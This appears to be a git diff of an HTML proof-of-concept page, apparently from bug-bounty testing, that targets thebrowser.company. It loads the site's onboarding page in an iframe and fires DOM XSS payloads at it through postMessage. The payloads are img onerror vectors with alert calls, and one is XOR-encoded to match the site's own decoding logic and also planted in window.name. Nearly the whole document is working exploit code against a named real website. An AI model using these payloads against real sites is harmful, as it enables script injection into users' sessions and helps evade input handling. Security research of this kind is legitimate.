@@ -1,45 +1,59 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Syfe PoC</title>
-  </head>
-  <body>
-    <h1>✅ PoC: Send postMessage</h1>
-    <iframe id="target" src="https://thebrowser.company/" width="100%" height="600"></iframe>
+<head>
+  <meta charset="utf-8">
+  <title>💥 DOM XSS – Full Exploit Chain</title>
+</head>
+<body>
+  <h2>✅ PoC: DOM XSS via postMessage + window.name + object payload</h2>
+  <p>This PoC tests multiple XSS vectors against thebrowser.company</p>
 
-    <script>
-      const iframe = document.getElementById("target");
+  <iframe id="target" src="https://thebrowser.company/onboarding" width="100%" height="600" style="border:2px solid #0f0;" sandbox="allow-scripts allow-same-origin"></iframe>
 
-      iframe.onload = () => {
-        console.log("✅ iframe loaded");
+  <script>
+    const iframe = document.getElementById("target");
 
-        const payloads = [
-          {
-            message: "OB_SHOULD_SHOW_PICKER",
-            content: {
-              marketerId: ["<img src=x onerror=alert(1)>"]
-            }
-          },
-          {
-            message: "OB_SHOULD_SHOW_PICKER",
-            content: {
-              marketerId: ["<script>alert(document.domain)</script>"]
-            }
-          },
-          {
-            message: "OB_SHOULD_SHOW_PICKER",
-            content: {
-              marketerId: ["<svg/onload=alert('xss')>"]
-            }
-          }
-        ];
+    // XOR encoding (from site logic)
+    function xorEncode(str, key = 0x66) {
+      const keyHex = key.toString(16).padStart(2, '0');
+      const encoded = Array.from(str).map(c =>
+        (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
+      ).join('');
+      return keyHex + encoded;
+    }
 
-        console.log("🚀 Sending fuzzed postMessage payloads...");
-        payloads.forEach((p, i) => {
-          console.log("🔁 Fuzz #" + (i + 1), p);
-          iframe.contentWindow.postMessage(p, "*");
-        });
+    // Changed payload to more reliable XSS vector
+    const xorPayload = "<img src=x onerror=alert('XSS from XOR')>";
+    const encodedXOR = xorEncode(xorPayload);
+
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
+
+      // ✅ Send object-based payload
+      const structuredPayload = {
+        message: "OB_SHOULD_SHOW_PICKER",
+        content: {
+          marketerId: [
+            `<img src=x onerror=alert('XSS via object')>`
+          ]
+        }
       };
-    </script>
-  </body>
+      
+      try {
+        iframe.contentWindow.postMessage(structuredPayload, "*");
+        console.log("🚀 Structured object postMessage sent.");
+
+        // ✅ Send XOR-encoded payload via postMessage
+        iframe.contentWindow.postMessage(encodedXOR, "*");
+        console.log("🚀 XOR payload sent via postMessage");
+
+        // ✅ Also set window.name for any listener inside iframe
+        iframe.contentWindow.name = encodedXOR;
+        console.log("🧠 window.name set.");
+      } catch (e) {
+        console.error("Error sending payloads:", e);
+      }
+    };
+  </script>
+</body>
 </html>
